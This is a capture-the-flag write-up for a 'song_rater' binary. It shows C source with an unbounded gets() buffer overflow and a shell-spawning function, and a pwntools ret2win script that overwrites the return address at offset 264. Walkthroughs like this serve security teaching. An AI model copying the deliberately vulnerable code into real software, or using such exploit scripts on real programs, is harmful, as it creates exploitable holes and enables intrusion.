# Description

Can you get this program to do what you want?

# Solution

We are given a bunch of files, we only care about the dockerfile to know the location of the 
flag and the C source code `song_rater.c` (the binary `song_rater` is x64 - run with `checksec`).
Lets look at the source code:
```C
void scratched_record() {
	printf("Oh no, your record seems scratched :(\n");
	printf("Here's a shell, maybe you can fix it:\n");
	execve("/bin/sh", NULL, NULL);
}

extern char *gets(char *s);

int main() {
	printf("Song rater v0.1\n-------------------\n\n");
	char buf[0xff];
	printf("Please enter your song:\n");
	gets(buf);
	printf("\"%s\" is an excellent choice!\n", buf);
	return 0;
}
```

This is a very simple ret2win, we only need to rewrite the return address of main to point to `scratched_record()` function
and we get the shell:
- first, get the RIP offset by using the cyclic command and inspecting the stack
  
<img width="449" alt="Untitled (2)" src="https://github.com/AdamZvara/CTF/assets/36104483/c34313b4-3736-4fc6-afa3-046632734cc3">

<img width="503" alt="Untitled" src="https://github.com/AdamZvara/CTF/assets/36104483/f6dc46b4-9435-4db7-afaf-c3395df18981">

Now we know that the offset is at 264B. Next we just need to insert the address of the scratched_record function (since no PIE is 
used, we can use the address directly). Here is the payload:
```python
offset = 264

# Start program
io = start()

print(elf.sym['scratched_record'])

# Build the payload
payload = flat({
    offset: [
        elf.sym['scratched_record']
    ]
})

# Send the payload
io.sendlineafter(b':\n', payload)

print(io.recvuntil(b':\n'))
io.interactive()
```

Upload it and get the flag

<img width="276" alt="Untitled (1)" src="https://github.com/AdamZvara/CTF/assets/36104483/db49075b-b8f6-4ba9-b4b0-3c4a6e70fd48">
